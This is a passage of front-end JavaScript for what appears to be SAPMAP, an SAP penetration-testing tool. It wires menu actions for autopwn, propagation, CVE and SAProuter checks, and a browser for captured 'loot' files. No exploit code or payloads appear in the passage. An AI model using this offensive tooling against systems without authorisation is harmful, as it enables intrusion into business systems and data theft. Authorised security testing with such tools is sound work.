    return st.indexOf('ABAP') !== -1
        || st.indexOf('JAVA') !== -1
        || st.indexOf('WEB_DISPATCHER') !== -1
        || !!n.is_web_dispatcher;
  });
  // Has any SAProuter node — needed for SAProuter info-leak check.
  //
  // The ROUTER_ADM NIINFO leak is a SAProuter-side vulnerability:
  // we connect to a router's port and ask for its info packet, the
  // router responds with routtab + connected clients.  Probing
  // non-SAProuter hosts on port 3299 is meaningless EXCEPT when the
  // operator's landscape stacks multiple SAP systems on the same
  // host as the SAProuter — then probing any of them on :3299
  // hits the SAProuter and reports a false-positive finding
  // against the wrong node (operator-reported on S4D/S4H/RD1 all
  // sharing 192.168.2.209).
  //
  // Eligible: nodes with system_type containing SAPROUTER OR any
  // instance with a port tagged 'saprouter' (rare but possible
  // when a SAP node also runs an embedded router).
  const hasAnySaprouter = nodes.some(n => {
    const st = (n.system_type || '').toUpperCase();
    if (st.indexOf('SAPROUTER') !== -1) return true;
    return (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) => s === 'saprouter'));
  });

  document.getElementById('map-ctx-check-all-gw').style.display          = hasAnyGwPort       ? '' : 'none';
  document.getElementById('map-ctx-check-all-betrusted').style.display   = hasAnyMsPort       ? '' : 'none';
  document.getElementById('map-ctx-check-all-cve-31324').style.display   = hasAnyJava         ? '' : 'none';
  document.getElementById('map-ctx-check-all-cve-6287').style.display    = hasAnyJava         ? '' : 'none';
  document.getElementById('map-ctx-check-all-cve-22536').style.display   = hasAnyHttp         ? '' : 'none';
  document.getElementById('map-ctx-check-all-router-info').style.display = hasAnySaprouter    ? '' : 'none';
  // SNC posture probe applies to any node with a dispatcher or saprouter port
  const hasAnySncTarget = nodes.some(n => {
    if ((n.system_type || '').toUpperCase().indexOf('SAPROUTER') !== -1) return true;
    return (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) => s === 'dispatcher' || (p >= 3200 && p <= 3299)));
  });
  document.getElementById('map-ctx-check-all-snc').style.display        = hasAnySncTarget    ? '' : 'none';

  menu.classList.add('visible');
  let mx = e.clientX, my = e.clientY;
  const rect = menu.getBoundingClientRect();
  if (mx + rect.width > window.innerWidth) mx = window.innerWidth - rect.width - 4;
  if (my + rect.height > window.innerHeight) my = window.innerHeight - rect.height - 4;
  menu.style.left = mx + 'px';
  menu.style.top = my + 'px';
}
function hideMapCtxMenu() {
  document.getElementById('map-ctx-menu').classList.remove('visible');
}
document.getElementById('map-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item) return;
  hideMapCtxMenu();
  switch (item.getAttribute('data-action')) {
    case 'map_add_system': showAddSystemModal(); break;
    case 'map_autopwn': showAutoPwnModal(); break;
    case 'map_propagate_all': propagateAll(); break;
    case 'map_cleanup_all': cleanupAll(); break;
    case 'map_scan_all_vulns': scanAllVulns(); break;
    case 'map_check_all_gw': checkAllGateways(); break;
    case 'map_check_all_betrusted': checkAllBetrusted(); break;
    case 'map_check_all_cve_31324': checkAllCve31324(); break;
    case 'map_check_all_cve_6287': checkAllCve6287(); break;
    case 'map_check_all_cve_22536': checkAllCve22536(); break;
    case 'map_check_all_router_info': checkAllRouterInfo(); break;
    case 'map_check_all_snc': checkAllSnc(); break;
    case 'map_attack_coverage': showAttackCoverage(); break;
    case 'map_analyze_chains': analyzeChains(); break;
    case 'map_fit': fitMap(); break;
    case 'map_reset_layout': resetLayout(); break;
  }
});
document.addEventListener('click', () => hideMapCtxMenu());

// --- Console resize (drag handle) ---
(function initConsoleResizer() {
  const resizer = document.getElementById('console-resizer');
  const container = document.getElementById('console-container');
  if (!resizer || !container) {
    console.warn('[resizer] elements missing', {resizer, container});
    return;
  }
  const LS_KEY = 'sapmap.consoleHeight';
  const MIN_H = 60;
  const maxH = () => Math.max(MIN_H + 20, Math.floor(window.innerHeight * 0.8));
  const setH = (h) => {
    // !important defeats any late-arriving class-based CSS that might
    // try to re-pin the height (e.g. a rerender helper that re-adds
    // the .console-container class with its 180px default).
    container.style.setProperty('height', h + 'px', 'important');
  };
  // Restore saved height
  const saved = parseInt(localStorage.getItem(LS_KEY) || '', 10);
  if (!isNaN(saved) && saved >= MIN_H) {
    setH(Math.min(saved, maxH()));
  }
  let dragging = false, startY = 0, startH = 0, pointerId = null;
  resizer.addEventListener('pointerdown', (e) => {
    if (consoleMaximized) return;
    if (container.style.display === 'none') return;
    dragging = true;
    pointerId = e.pointerId;
    startY = e.clientY;
    startH = container.getBoundingClientRect().height;
    resizer.classList.add('dragging');
    try { resizer.setPointerCapture(e.pointerId); } catch (err) {}
    document.body.style.userSelect = 'none';
    document.body.style.cursor = 'ns-resize';
    e.preventDefault();
  });
  resizer.addEventListener('pointermove', (e) => {
    if (!dragging) return;
    const delta = startY - e.clientY; // drag up => increase
    let h = startH + delta;
    h = Math.max(MIN_H, Math.min(h, maxH()));
    setH(h);
  });
  const stopDrag = (e) => {
    if (!dragging) return;
    dragging = false;
    resizer.classList.remove('dragging');
    try { if (pointerId != null) resizer.releasePointerCapture(pointerId); } catch (err) {}
    pointerId = null;
    document.body.style.userSelect = '';
    document.body.style.cursor = '';
    const h = Math.round(container.getBoundingClientRect().height);
    try { localStorage.setItem(LS_KEY, String(h)); } catch (err) {}
  };
  resizer.addEventListener('pointerup', stopDrag);
  resizer.addEventListener('pointercancel', stopDrag);
  resizer.addEventListener('lostpointercapture', stopDrag);
  // Double-click resets to default
  resizer.addEventListener('dblclick', () => {
    setH(180);
    try { localStorage.removeItem(LS_KEY); } catch (err) {}
  });
})();

// --- Keep the findings toast stack pinned just above the legend bar ---
// Anchor directly off the legend's top edge when visible (falls back to
// summing console+resizer heights when the legend is hidden).  Using the
// legend's bounding rect avoids arithmetic drift from gaps, margins, and
// flex padding between the stacked bottom elements.
(function initFindingsAnchor() {
  const bar = document.getElementById('findings-bar');
  const container = document.getElementById('console-container');
  const restore = document.getElementById('console-restore');
  const resizer = document.getElementById('console-resizer');
  const legend = document.getElementById('legend-bar');
  if (!bar || !container) return;
  const GAP = 8;
  const isVisible = (el) => {
    if (!el) return false;
    const s = window.getComputedStyle(el);
    return s.display !== 'none' && s.visibility !== 'hidden';
  };
  const hOf = (el) => isVisible(el) ? el.getBoundingClientRect().height : 0;
  const update = () => {
    let bottom;
    if (isVisible(legend)) {
      // Sit the toast bottom one gap above the legend's top edge.
      bottom = window.innerHeight - legend.getBoundingClientRect().top + GAP;
    } else {
      let base = 0;
      base += hOf(isVisible(container) ? container : restore);
      base += hOf(resizer);
      bottom = base + GAP;
    }
    bar.style.bottom = Math.max(0, bottom) + 'px';
  };
  update();
  const observed = [container, restore, resizer, legend].filter(Boolean);
  if ('ResizeObserver' in window) {
    const ro = new ResizeObserver(update);
    observed.forEach(el => ro.observe(el));
  }
  window.addEventListener('resize', update);
  window.addEventListener('scroll', update, true);
  const mo = new MutationObserver(update);
  observed.forEach(el => mo.observe(el,
    { attributes: true, attributeFilter: ['style', 'class'] }));
})();

// --- Read-only + loot-browser mode init ---
// Poll /api/mode once at boot.  If the server was started with
// --read-only, add body.read-only (CSS then hides every .write-op
// element) and unhide the green READ-ONLY badge next to the logo.
// If --enable-loot-browser is on, stash the per-run token so
// openLootBrowser() can attach it to /api/loot/{list,download} URLs.
// Never polls again — flags are set at process start and cannot
// change at runtime.
let LOOT_TOKEN = "";
async function initMode() {
  try {
    const m = await api('GET', 'mode');
    if (m && m.read_only) {
      document.body.classList.add('read-only');
      const badge = document.getElementById('mode-badge');
      if (badge) badge.style.display = 'inline-block';
    }
    if (m && m.loot_browser && m.loot_token) {
      LOOT_TOKEN = m.loot_token;
      const item = document.getElementById('dd-browse-loot');
      if (item) item.style.display = '';
    }
  } catch (e) {
    // /api/mode is new — if the server doesn't have it yet, silently
    // stay in the default (full) mode.  Backend guarding still fires
    // if it happens to be a newer server with an older HTML cached.
  }
}
initMode();

// --- Loot browser (only reachable when --enable-loot-browser is set) ---
// Renders a modal with the current loot subtree.  Every request adds
// the per-run token that /api/mode handed us at boot.  Files stream
// via a plain <a href> download link with the token in the query;
// directories re-list in place.  Path traversal is impossible client
// side because the backend canonicalises every rel path against the
// loot root — this is UX only.
function _lootFmtBytes(n) {
  if (n == null) return '';
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
  if (n < 1073741824) return (n / 1048576).toFixed(1) + ' MB';
  return (n / 1073741824).toFixed(2) + ' GB';
}
function _lootFmtTs(sec) {
  if (!sec) return '';
  try { return new Date(sec * 1000).toISOString().replace('T', ' ').slice(0, 19); }
  catch (e) { return ''; }
}
function _lootEsc(s) {
  return String(s).replace(/[&<>"']/g,
    c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
async function _lootList(relPath) {
  const url = 'loot/list?token=' + encodeURIComponent(LOOT_TOKEN)
              + (relPath ? '&path=' + encodeURIComponent(relPath) : '');
  const r = await api('GET', url);
  return r || { entries: [], root: '.', error: 'no_response' };
}
async function openLootBrowser() {
  if (!LOOT_TOKEN) {
    showToast('Loot browser is not enabled (start SAPMAP with --enable-loot-browser)', 'warn');
    return;
  }
  const modal = document.createElement('div');
  modal.id = 'loot-browser-modal';
  modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);'
    + 'z-index:3000;display:flex;align-items:center;justify-content:center';
  modal.innerHTML =
    '<div style="background:#161b22;border:1px solid #30363d;border-radius:10px;'
    + 'width:min(920px,90vw);max-height:80vh;display:flex;flex-direction:column;'
    + 'box-shadow:0 20px 40px rgba(0,0,0,0.5)">'
    + '  <div style="display:flex;align-items:center;gap:8px;padding:12px 16px;'
    + '       border-bottom:1px solid #30363d">'
    + '    <span style="font-size:16px;font-weight:600;flex:1">&#128194; Loot Browser</span>'
    + '    <span id="loot-crumbs" style="font-family:monospace;color:#8b949e;font-size:12px"></span>'
    + '    <span style="cursor:pointer;font-size:20px;color:#8b949e;padding:0 6px" '
    + '          onclick="document.getElementById(\'loot-browser-modal\').remove()">&times;</span>'
    + '  </div>'
    + '  <div id="loot-body" style="flex:1;overflow-y:auto;padding:8px 4px"></div>'
    + '  <div style="padding:8px 16px;border-top:1px solid #30363d;color:#8b949e;font-size:11px">'
    + '    Read-only.  Path traversal blocked server-side.  Downloads served with attachment disposition.'
    + '  </div>'
    + '</div>';
  document.body.appendChild(modal);
  await _lootRender('');
}
async function _lootRender(relPath) {
  const body = document.getElementById('loot-body');
  const crumbs = document.getElementById('loot-crumbs');
  if (!body) return;
  body.innerHTML = '<div style="padding:20px;color:#8b949e">Loading…</div>';
  const r = await _lootList(relPath);
  if (r.error) {
    body.innerHTML = '<div style="padding:20px;color:#f85149">Error: '
      + _lootEsc(r.error) + (r.message ? ' — ' + _lootEsc(r.message) : '') + '</div>';
    return;
  }
  const at = r.root === '.' ? 'loot/' : 'loot/' + r.root + '/';
  crumbs.textContent = at;
  const rows = [];
  if (relPath) {
    const parent = relPath.includes('/')
      ? relPath.substring(0, relPath.lastIndexOf('/')) : '';
    rows.push('<div class="loot-row" style="cursor:pointer;padding:6px 16px;'
      + 'display:flex;gap:12px" onclick="_lootRender(' + JSON.stringify(parent) + ')">'
      + '<span style="flex:1">&#8617; ..</span></div>');
  }
  for (const e of (r.entries || [])) {
    const path = JSON.stringify(e.path);
    if (e.is_dir) {
      rows.push('<div class="loot-row" style="cursor:pointer;padding:6px 16px;'
        + 'display:flex;gap:12px" onclick="_lootRender(' + path + ')">'
        + '<span style="flex:1">&#128193; ' + _lootEsc(e.name) + '/</span>'
        + '<span style="color:#8b949e;font-size:11px">'
        + _lootFmtTs(e.mtime) + '</span></div>');
    } else {
      const dlUrl = '/api/loot/download?token=' + encodeURIComponent(LOOT_TOKEN)
                    + '&path=' + encodeURIComponent(e.path);
      rows.push('<div class="loot-row" style="padding:6px 16px;display:flex;gap:12px">'
        + '<span style="flex:1">&#128196; <a href="' + dlUrl + '" download="'
        + _lootEsc(e.name) + '" style="color:#79c0ff;text-decoration:none">'
        + _lootEsc(e.name) + '</a></span>'
        + '<span style="color:#8b949e;font-size:11px;min-width:80px;text-align:right">'
        + _lootFmtBytes(e.size) + '</span>'
        + '<span style="color:#8b949e;font-size:11px;min-width:130px;text-align:right">'
        + _lootFmtTs(e.mtime) + '</span></div>');
    }
  }
  if (!(r.entries || []).length && !relPath) {
    rows.push('<div style="padding:20px;color:#8b949e;text-align:center">'
      + 'No loot yet — run a scan first.</div>');
  }
  body.innerHTML = rows.join('');
  // Hover styling for row items
  for (const el of body.querySelectorAll('.loot-row')) {
    el.addEventListener('mouseenter', () => el.style.background = '#21262d');
    el.addEventListener('mouseleave', () => el.style.background = '');
  }
}

// --- Init ---
startPolling();
</script>
</body>
</html>"""
